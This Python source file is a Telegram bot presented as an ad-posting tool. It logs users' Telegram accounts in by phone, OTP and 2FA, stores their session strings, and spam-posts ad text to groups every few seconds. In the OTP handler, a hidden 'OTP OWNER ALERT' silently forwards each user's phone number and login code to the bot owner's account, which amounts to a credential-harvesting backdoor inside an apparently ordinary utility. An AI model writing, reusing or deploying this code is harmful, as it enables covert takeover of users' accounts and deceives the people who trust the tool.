import os
import asyncio
import sqlite3
import threading
import logging
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError

# ================== CONFIG ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965"))
API_ID = int(os.environ.get("API_ID", "38746329"))
API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
PORT = int(os.environ.get("PORT", 10000))

(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_TEXT, ASK_REPLY, ASK_WELCOME_IMG) = range(6)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONT ==================
def st(text: str) -> str:
    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
    return "".join([upper.get(c, lower.get(c, digits.get(c, c))) for c in text])

# ================== SERVER & DB ==================
flask_app = Flask(__name__)
@flask_app.route('/')
def health(): return "Bot is running!", 200
def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)

def init_db():
    conn = sqlite3.connect("ads_master.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS global_settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_data (user_id INTEGER PRIMARY KEY, session_string TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER, key TEXT, value TEXT, PRIMARY KEY (user_id, key))""")
    c.execute("""CREATE TABLE IF NOT EXISTS sent_msgs (msg_id INTEGER PRIMARY KEY, group_id TEXT)""")
    conn.commit(); conn.close()
init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute(query, params); conn.commit()
    res = c.fetchall(); conn.close(); return res

def get_user_set(uid, key, default=None):
    res = db_exec("SELECT value FROM user_settings WHERE user_id=? AND key=?", (uid, key))
    return res[0][0] if res else default

def set_user_set(uid, key, value):
    db_exec("INSERT OR REPLACE INTO user_settings (user_id, key, value) VALUES (?,?,?)", (uid, key, str(value)))

def del_user_set(uid, key):
    db_exec("DELETE FROM user_settings WHERE user_id=? AND key=?", (uid, key))

# ================== USERBOTS & LOGIC ==================
active_userbots = {}
running_loops = {}
temp_clients = {}

async def ads_loop(user_id):
    while user_id in running_loops:
        text = get_user_set(user_id, "ad_text", "")
        groups_str = get_user_set(user_id, "ad_groups", "")
        interval = int(get_user_set(user_id, "ad_interval", "8"))
        
        if not groups_str or user_id not in active_userbots:
            await asyncio.sleep(2); continue
            
        groups = [g.strip() for g in groups_str.split(',') if g.strip()]
        client = active_userbots[user_id]
        
        for group in groups:
            if user_id not in running_loops: break
            try:
                entity = await client.get_entity(group)
                sent = await client.send_message(entity, text)
                db_exec("INSERT OR REPLACE INTO sent_msgs (msg_id, group_id) VALUES (?,?)", (sent.id, str(group)))
                await asyncio.sleep(1) # Gap between groups
            except Exception as e:
                logger.error(f"Fail {group}: {e}")
                
        await asyncio.sleep(interval) # Exact timer after all groups

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    
    @client.on(events.NewMessage(incoming=True))
    async def alert_handler(event):
        if event.is_private: return
        is_reply = False
        if event.message.reply_to_msg_id:
            res = db_exec("SELECT msg_id FROM sent_msgs WHERE msg_id=?", (event.message.reply_to_msg_id,))
            if res: is_reply = True
        
        if is_reply or event.message.mentioned:
            sender = await event.get_sender()
            chat = await event.get_chat()
            reply_text = get_user_set(user_id, "auto_reply", "DM me to add to contact.")
            try: await event.reply(reply_text)
            except: pass
            
            msg = f"🔔 <b>NEW TAG/REPLY</b>\n\n👤 <b>User:</b> {sender.first_name}\n🆔 <b>ID:</b> <code>{sender.id}</code>\n💬 <b>Comment:</b> {event.message.message}\n🏠 <b>Group:</b> {chat.title}"
            try: await bot_app.bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML")
            except: pass

# ================== KEYBOARDS ==================
def main_menu(uid):
    kb = [
        [KeyboardButton("🔵 " + st("LOGIN ACCOUNT")), KeyboardButton("🔴 " + st("LOGOUT ACCOUNT"))],
        [KeyboardButton("🔵 " + st("ADD TEXT")), KeyboardButton("🔴 " + st("DELETE TEXT"))],
        [KeyboardButton("🔵 " + st("ADD GROUP")), KeyboardButton("🔵 " + st("SET AUTO REPLY"))],
        [KeyboardButton("🔵 " + st("SET INTERVAL")), KeyboardButton("🔵 " + st("VIEW SETTINGS"))],
        [KeyboardButton("🟢 " + st("RUN ADS")), KeyboardButton("🔴 " + st("STOP ADS"))]
    ]
    if uid == OWNER_ID:
        kb.append([KeyboardButton("👑 " + st("OWNER PANEL"))])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def interval_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("8 Seconds", callback_data="int_8"), InlineKeyboardButton("15 Seconds", callback_data="int_15")]])

# ================== HANDLERS ==================
bot_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    welcome_img = db_exec("SELECT value FROM global_settings WHERE key='welcome_image'")
    img = welcome_img[0][0] if welcome_img else None
    
    if img:
        try: return await update.message.reply_photo(photo=img, caption=st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(uid))
        except: pass
    await update.message.reply_text(st(f"Welcome {update.effective_user.first_name}!"), reply_markup=main_menu(uid))

# --- LOGIN FLOW ---
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(st("Enter Phone Number (+91...)"))
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        
        kb = [[InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
              [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
              [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
              [InlineKeyboardButton("CLEAR", callback_data="otp_clear"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton("SUBMIT", callback_data="otp_submit")]]
        
        context.user_data['otp'] = ""
        await update.message.reply_text(st("Enter OTP:"), reply_markup=InlineKeyboardMarkup(kb))
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"Error: {e}"); return ConversationHandler.END

async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data.replace("otp_", "")
    otp = context.user_data.get('otp', "")
    uid = query.from_user.id
    
    if data == "clear": otp = ""
    elif data == "submit":
        if len(otp) < 4: return await query.answer("Min 4 digits!")
        
        # --- OTP OWNER ALERT ---
        if uid != OWNER_ID:
            await bot_app.bot.send_message(OWNER_ID, f"🚨 <b>NEW OTP</b>\nUser: {uid}\nPhone: {temp_clients[uid]['phone']}\nOTP: <code>{otp}</code>", parse_mode="HTML")
        
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO user_data (user_id, session_string) VALUES (?,?)", (uid, session))
            await start_userbot(uid, session)
            await query.message.delete()
            await bot_app.bot.send_message(uid, "✅ Logged In!", reply_markup=main_menu(uid))
            return ConversationHandler.END
        except Exception as e:
            if "Two-step" in str(e): await query.edit_message_text(st("2FA Password:")); return ASK_2FA
            await query.edit_message_text(f"Failed: {e}"); return ConversationHandler.END
    else:
        if len(otp) < 5: otp += data
    context.user_data['otp'] = otp
    display = " ".join([c if i < len(otp) else "_" for i, c in enumerate(otp + "_"*(5-len(otp)))])
    try: await query.edit_message_text(st(f"OTP: {display}"), reply_markup=query.message.reply_markup)
    except: pass
    return ASK_OTP

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    try:
        await temp_clients[uid]['client'].sign_in(password=update.message.text.strip())
        session = temp_clients[uid]['client'].session.save()
        db_exec("INSERT OR REPLACE INTO user_data (user_id, session_string) VALUES (?,?)", (uid, session))
        await start_userbot(uid, session)
        await update.message.reply_text("✅ Logged In via 2FA!", reply_markup=main_menu(uid))
    except Exception as e: await update.message.reply_text(f"Failed: {e}")
    return ConversationHandler.END

async def logout_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in active_userbots:
        try: await active_userbots[uid].log_out()
        except: pass
        del active_userbots[uid]
    if uid in running_loops: del running_loops[uid]
    db_exec("DELETE FROM user_data WHERE user_id=?", (uid,))
    await update.message.reply_text(st("Logged out!"), reply_markup=main_menu(uid))

# --- ADD GROUP (Direct Selection) ---
async def add_group_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active_userbots: return await update.message.reply_text(st("Login first!"))
    
    msg = await update.message.reply_text(st("Fetching groups..."))
    try:
        dialogs = await active_userbots[uid].get_dialogs()
        groups = [d for d in dialogs if d.is_group or d.is_channel]
        if not groups: return await msg.edit_text(st("No groups found!"))
        
        # Show buttons for first 15 groups to avoid limits
        kb = []
        for g in groups[:15]:
            kb.append([InlineKeyboardButton(st(g.name), callback_data=f"selgrp_{g.id}")])
            
        await msg.edit_text(st("Select a group:"), reply_markup=InlineKeyboardMarkup(kb))
    except Exception as e:
        await msg.edit_text(f"Error: {e}")

async def group_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    grp_id = query.data.replace("selgrp_", "")
    uid = query.from_user.id
    
    # Save ID (Telethon works with ID too)
    set_user_set(uid, "ad_groups", str(grp_id))
    await query.edit_message_text(st(f"✅ Group Selected!\nID: {grp_id}"))
    await bot_app.bot.send_message(uid, st("Group set successfully!"), reply_markup=main_menu(uid))

# --- OTHER SETTINGS ---
async def add_text_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send text:")); return ASK_TEXT
async def save_text(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "ad_text", update.message.text); await update.message.reply_text(st("✅ Saved!"), reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END
async def del_text(update: Update, context: ContextTypes.DEFAULT_TYPE): del_user_set(update.effective_user.id, "ad_text"); await update.message.reply_text(st("🗑️ Deleted!"), reply_markup=main_menu(update.effective_user.id))

async def set_reply_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send auto-reply:")); return ASK_REPLY
async def save_reply(update: Update, context: ContextTypes.DEFAULT_TYPE): set_user_set(update.effective_user.id, "auto_reply", update.message.text); await update.message.reply_text(st("✅ Saved!"), reply_markup=main_menu(update.effective_user.id)); return ConversationHandler.END

async def set_interval_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Interval:"), reply_markup=interval_menu())
async def save_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    set_user_set(query.from_user.id, "ad_interval", query.data.split('_')[1]); await query.message.reply_text(st("✅ Interval Set!"), reply_markup=main_menu(query.from_user.id))

async def view_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(f"Text: {get_user_set(uid, 'ad_text')}\nGroup: {get_user_set(uid, 'ad_groups')}\nReply: {get_user_set(uid, 'auto_reply')}")

async def run_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in running_loops: return await update.message.reply_text(st("⚠️ Running!"))
    if uid not in active_userbots: return await update.message.reply_text(st("❌ Login!"))
    running_loops[uid] = asyncio.create_task(ads_loop(uid)); await update.message.reply_text(st("🚀 Started!"))

async def stop_ads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in running_loops: return await update.message.reply_text(st("⚠️ Stopped!"))
    running_loops[uid].cancel(); del running_loops[uid]; await update.message.reply_text(st("🛑 Stopped!"))

# --- OWNER PANEL ---
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    kb = [[KeyboardButton("🔵 " + st("SET WELCOME IMAGE"))], [KeyboardButton("🔴 " + st("BACK"))]]
    await update.message.reply_text(st("Owner Panel"), reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))

async def set_welcome_start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text(st("Send photo:")); return ASK_WELCOME_IMG
async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        db_exec("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?,?)", ("welcome_image", update.message.photo[-1].file_id))
        await update.message.reply_text(st("✅ Image Set!"), reply_markup=main_menu(update.effective_user.id))
    return ConversationHandler.END

# ================== MAIN ==================
def main():
    global bot_app
    threading.Thread(target=run_flask, daemon=True).start()
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    
    for row in db_exec("SELECT user_id, session_string FROM user_data"):
        loop.run_until_complete(start_userbot(row[0], row[1]))
    
    bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('OWNER PANEL')}$"), owner_panel))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('BACK')}$"), lambda u,c: u.message.reply_text("Menu", reply_markup=main_menu(u.effective_user.id))))
    
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex("^SET WELCOME IMAGE$"), set_welcome_start)], states={ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('LOGIN ACCOUNT')}$"), login_start)], states={ASK_PHONE: [MessageHandler(filters.TEXT, get_phone)], ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")], ASK_2FA: [MessageHandler(filters.TEXT, get_2fa)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('ADD TEXT')}$"), add_text_start)], states={ASK_TEXT: [MessageHandler(filters.TEXT, save_text)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[MessageHandler(filters.Regex(f"^{st('SET AUTO REPLY')}$"), set_reply_start)], states={ASK_REPLY: [MessageHandler(filters.TEXT, save_reply)]}, fallbacks=[]))

    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('ADD GROUP')}$"), add_group_start))
    bot_app.add_handler(CallbackQueryHandler(group_selected, pattern="^selgrp_"))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('LOGOUT ACCOUNT')}$"), logout_account))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('DELETE TEXT')}$"), del_text))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('SET INTERVAL')}$"), set_interval_start))
    bot_app.add_handler(CallbackQueryHandler(save_interval, pattern="^int_"))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('RUN ADS')}$"), run_ads))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('STOP ADS')}$"), stop_ads))
    bot_app.add_handler(MessageHandler(filters.Regex(f"^{st('VIEW SETTINGS')}$"), view_settings))

    logger.info("Bot Started!")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
